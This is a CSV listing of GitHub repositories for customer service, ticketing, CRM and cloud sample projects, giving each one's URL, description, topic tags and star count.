,Url,Description,Topics,Stars
0,https://github.com/chatwoot/chatwoot.git,"Open-source customer engagement suite, an alternative to Intercom, Zendesk, Salesforce Service Cloud etc. 🔥💬","vuejs,intercom,drift,zendesk,rails,design,sass,actioncable,opensource,livechat,javascript,chatwoot,docker,docker-image,heroku,conversation,customer-support,whatsapp,chat-widget,dashboard",9144
1,https://github.com/OTRS/otrs.git,"((OTRS)) Community Edition is one of the most flexible web-based ticketing systems used for Customer Service, Help Desk, IT Service Management. Please note that ((OTRS)) Community Edition offers limited OTRS functionality.","otrs,helpdesk,process-management,ticket-system,webservice",778
2,https://github.com/aws-samples/retail-demo-store.git,"AWS Retail Demo Store is a sample retail web application and workshop platform demonstrating how AWS infrastructure and services can be used to build compelling customer experiences for eCommerce, retail, and digital marketing use-cases","aws,personalize,pinpoint,cognito,ecs,fargate,amplify,vuejs,elasticsearch,cloudfront,codepipeline,workshops,ecommerce",271
3,https://github.com/alfallouji/DHL-API.git,"This library provides a PHP client for the DHL XML Services. DHL XML Services is an online web services integration capability that provides DHL’s service availability, transit times, rates, shipment and courier pickup booking along with shipment tracking from over 140 countries around the world. Using DHL’s XML Services, customers can incorporate DHL shipping functionality into their websites, customer service applications or order processing systems.",,181
4,https://github.com/awslabs/aws-centralized-logging.git,"The Centralized Logging solution enables organizations to collect, analyze, and display logs on AWS across multiple accounts and AWS Regions. The solution uses Amazon Elasticsearch Service (Amazon ES), a managed service that simplifies the deployment, operation, and scaling of Elasticsearch clusters in the AWS Cloud, as well as Kibana, an analytics and visualization platform that is integrated with Amazon ES. In combination with other AWS managed services, this solution offers customers a customizable, multi-account environment to begin logging and analyzing their AWS environment and applications.",,173
5,https://github.com/Star2Billing/a2billing.git,"A2Billing is a telecom switch and billing system capable of providing and billing a range of telecom products and services to customers such as calling card products, residential and wholesale VoIP termination, DID resale and callback services.",,166
6,https://github.com/DanWahlin/Angular-NodeJS-MongoDB-CustomersService.git,Code for the Integrating Angular with Node.js RESTful Services Pluralsight course.,"angular,nodejs,mongodb,rxjs,observables,http",165
7,https://github.com/owainlewis/status.git,"An open source, self hosted status page application for communicating service incidents to customers.","monitoring,status-dashboard,status-page",149
8,https://github.com/awslabs/aws-control-tower-customizations.git,"The Customizations for AWS Control Tower solution combines AWS Control Tower and other highly-available, trusted AWS services to help customers more quickly set up a secure, multi-account AWS environment using AWS best practices.",,120
9,https://github.com/awslabs/iot-device-simulator.git,The IoT Device Simulator solution is a Graphical User Interface (GUI) based engine designed to enable customers to get started quickly assessing AWS IoT services without an existing pool of devices. The IoT Device Simulator helps effortlessly create and simulate thousands of connected devices that are defined by the customer.,,103
10,https://github.com/rubenwouters/crm-launcher.git,L5: integrate customer service via socal media (Twitter & Facebook),,90
11,https://github.com/wppconnect-team/wppconnect.git,"WPPConnect is an open source project developed by the JavaScript community with the aim of exporting functions from WhatsApp Web to the node, which can be used to support the creation of any interaction, such as customer service, media sending, intelligence recognition based on phrases artificial and many other things, use your imagination.","sulla,bot,chat,framework,ai,chatbot,message,whatsapp,whatsapp-bot,whatsapp-api,puppeteer,zap-api,open-source,nodejs,automate,wa,wppconnect,api,typescript,chatbots",87
12,https://github.com/aws-samples/amazon-lex-customerservice-workshop.git,"Code and walkthrough labs to create a customer service chatbot using Amazon Lex (and integrations with Amazon Connect, Twilio SMS, etc.)",,80
13,https://github.com/Azure/Service-Fabric-Troubleshooting-Guides.git,Service Fabric Trouble Shooting Guides used by Azure Customer Support Services and Product Group Site Reliability Engineers.,,77
14,https://github.com/luckyshot/CRMx.git,"CRMx is a super-flexible micro-CRM system for personal, freelance and small businesses. It can be customized very quickly for Customer Relationship Management, Lead Management System, Project Management, To-Do List or any other usage due to its flexibility in customization and scalable code. CRMx allows unlimited users to work in the same or different environments very flexibly. CRMx works through a RESTful API which allows third-party services and other software to interact neatly. CRMx also has a User Access Control system (UAC) to define permissions for each user and have maximum control over the organization.","php,crm,crm-online,crm-system,mysql-database,productivity,sales,business,freelance,bootstrap",70
15,https://github.com/awslabs/speke-reference-server.git,"{""Secure Packager and Encoder Key Exchange (SPEKE) is part of the AWS Elemental content encryption protection strategy for media services customers. SPEKE defines the standard for communication between our media services and digital rights management (DRM) system key servers. This project provides the basic framework that partners can specialize and extend to support their specific method of Digital Rights Management while utilizing AWS' video streaming solutions.""}","mediaconnect,mediapackage,speke,drm,encryption,media,video,serverless",64
16,https://github.com/DanWahlin/Angular-ASPNET-Core-CustomersService.git,Angular and ASP.NET Core RESTful Services ,,61
17,https://github.com/RotherOSS/otobo.git,"OTOBO is one of the most flexible web-based ticketing systems used for Customer Service, Help Desk, IT Service Management. https://www.otobo.de/",,61
18,https://github.com/amazon-archives/cost-optimization-monitor.git,Cost Optimization Monitor solution as a reference deployment which provides dashboard and reporting capabilities giving customers a single-pane-of-glass view of their current AWS service inventory.,,60
19,https://github.com/Azure-Samples/functions-customer-reviews.git,"This sample showcases the Azure Functions tooling for Visual Studio 2017. It has a website where customers submit reviews, stored in Azure storage blobs and CosmosDB; and an Azure Function for automated moderation of customer reviews using Microsoft Cognitive Services. It uses an Azure storage queue to decouple the website from the function.",,51
20,https://github.com/DanWahlin/AngularCLI-ASPNET-Core-CustomersService.git,Example of integrating Angular with ASP.NET Core RESTful Services,"angular,webapi,asp-net-core,entity-framework-core",49
21,https://github.com/Azure-Samples/customer-car-reviews.git,This is a sample application which acts as a Car Review web site and showcases the Azure Serverless services.,,46
22,https://github.com/oracle/oci-service-broker.git,Oracle Cloud Infrastructure Service Broker is an open source implementation of Open service broker API Spec for OCI services. Customers can use this implementation to install Open Service Broker in Oracle Container Engine for Kubernetes or in other Kubernetes clusters.,"kubernetes,kubernetes-clusters,oracle-cloud-infrastructure,osbapi,service-broker,oci-service-broker,autonomous-database,helm-chart",43
23,https://github.com/Azure/aks-hci.git,"# Welcome to the Azure Kubernetes Service on Azure Stack HCI repo This is where the AKS-HCI team will track features and issues with AKS-HCI. We will monitor this repo in order to engage with our community and discuss questions, customer scenarios, or feature requests.  Checkout our projects tab to see the roadmap for AKS-HCI!",,41
24,https://github.com/Azure/App-Service-Migration-Assistant.git,Azure Websites Migration Assistant for Windows is a tool that allows customers to move their existing sites hosted on IIS servers into the cloud on Azure App Service. For more information check out https://appmigration.microsoft.com .,,38
25,https://github.com/SeunghunSunmoonLee/React.ai.git,"It recognize your speech and trained AI Bot will respond(i.e Customer Service, Personal Assistant) using Machine Learning API (DialogFlow, apiai), Speech Recognition, GraphQL, Next.js, React, redux","react,machine-learning,dialogflow,apiai,speech-recognition,speech-to-text,speech-recognizer,nextjs,next,graphql,universal,universal-react,universal-javascript,production,production-ready,ai,artifical-intelligense",36
26,https://github.com/CloudaYolla/aws-serverless-data-lake-workshop.git,"This workshop\xa0is meant to give customers a hands-on experience with mentioned AWS services.\xa0 Serverless Data Lake workshop helps customers build a cloud-native and future-proof serverless data lake architecture.  It allows hands-on time with AWS big data and analytics services including Amazon Kinesis Services for streaming data ingestion and analytics, AWS Glue for ETL and Data Catalogue Management, Amazon Athena to query data lake. ",,32
27,https://github.com/DanWahlin/AngularCLI-NodeJS-MongoDB-CustomersService.git,Code for the Integrating Angular with Node.js RESTful Services Pluralsight course.,,28
28,https://github.com/Azure/Azure-AppServices-Diagnostics.git,Azure App Service Diagnostics provides developers ability to write various diagnostics features which helps customers to diagnose and troubleshoot their applications hosted on app services.,,28
29,https://github.com/Akkireddy1/Online-Banking-system-1.git,"{""The project’s primary goals consist of: A robust and effective web based online banking system.  Extending functionality without compromising the security.  Personal banking services that gives you complete control over all your banking demands online.  Simple and easy user interface to work with.  Online Banking features: Registration for online banking by Admin.  Adding Beneficiary account by customer.  Transferring amount to the beneficiary added by customer.  Staff must approve for beneficiary activation before it can be used for transferring funds.  Customer gets to know his last login date and time each time he logs in.  Customer can check last 10 transactions made with their account.  Customer can check their account statement within a date range.  Customer can request for ATM and Cheque Book.  Staff will approve requests for ATM card and cheque book.  Admin can add/edit/delete customer as well as staff.  All three of them(customer, staff & admin) can change their password.  Staff and Admin Login pages are hidden from customer for security purpose.  Security: Each and every input is passed through mysql_real_escape_string() to remove special characters from the string so that user can’t submit arbitrary input. It protects from attacks like Sql Injection and Cross Site Scripting(XSS).  Passwords are encrypted with SHA- 1 hashing algorithm and then stored in database.  Passwords are stored as encrypted hashes with an additional random salt for added security.  Note: If we talk about security,above mentioned points would provide no security at all but it will work for beginners. Being into web app pentesting,I very well know this project will not be considered secure. It needs atleast a more effective filtering mechanism, better hashing algorithm, a better salting procedure for storing passwords and some other things too.  Database: The database contains customer, staff & admin tables.  Each customer has its own virtual passbook linked with its account number.  Staff, customer and, admin have their details and password in their respective tables with all the details.  A separate table for beneficiary is included in the database.  A table for cheque book and ATM requests is included.  This project is divided into three hierarchical parts:  The index page for the customer login.  A hidden staff login page.  A hidden admin login page.  Usage: 1.Install XAMPP or something similar.  2.Copy all the files to c:/xampp/htdocs/banking/  3.Create a db named as 'bnak_db' and import the bank_db.sql from phpMyAdmin.  4.change the password in _inc/dbconn.php file accordingly.  5.visit localhost/banking (customer index page)  6.visit localhost/banking/adminlogin.php (admin login)  7.visit the localhost/banking/staff_login.php (staff login)""}",,28
30,https://github.com/microsoft/SqlSupportTools.git,This repo is used to share various tools used to support SQL Server issues by Customer Support Service,,26
31,https://github.com/awslabs/smart-product-solution.git,The Smart Product Solution is a customer deployable reference architecture to help manufacturers to jumpstart development of innovative connected/smart product services.,,25
